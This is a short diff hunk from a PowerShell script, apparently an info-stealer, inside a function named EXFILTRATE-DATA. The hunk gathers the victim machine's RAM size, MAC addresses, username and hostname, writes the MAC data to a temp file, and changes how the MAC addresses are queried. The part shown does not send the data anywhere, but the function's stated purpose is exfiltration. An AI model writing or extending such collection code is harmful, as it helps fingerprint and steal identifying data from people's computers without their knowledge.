@@ -22,7 +22,7 @@ function EXFILTRATE-DATA {
     $format = " GB"
     $total = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | Foreach {"{0:N2}" -f ([math]::round(($_.Sum / 1GB),2))}
     $raminfo = "$total" + "$format"  
-    $mac = Get-NetAdapter -Name "*Wi-Fi*" | Select-Object -ExpandProperty MACAddress
+    $mac = Get-WmiObject win32_networkadapterconfiguration | select description, macaddress
     $mac > $env:LOCALAPPDATA\Temp\mac.txt
     $username = $env:USERNAME
     $hostname = $env:COMPUTERNAME
